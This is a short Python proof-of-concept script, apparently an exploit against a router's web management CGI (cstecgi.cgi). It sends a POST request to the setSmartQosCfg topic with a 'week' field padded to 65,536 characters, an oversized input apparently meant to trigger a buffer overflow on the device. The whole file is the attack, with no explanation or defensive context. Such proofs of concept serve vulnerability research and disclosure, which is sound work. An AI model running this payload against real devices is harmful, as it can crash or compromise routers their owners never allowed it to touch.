import requests

target_ip = "127.0.0.1"

url = f"http://{target_ip}/cgi-bin/cstecgi.cgi"

headers = {
    # "Cookie": "SESSION_ID=2:1730964440:2"
}
data = {
    "topicurl": "setSmartQosCfg",
    "addEffect": "0",
    "week": "a"*0x10000,
    "sTime": "b"*0x1,
    "eTime": "c"*0x1
}

res = requests.post(url, headers, json=data)
print(res.text)
print(res)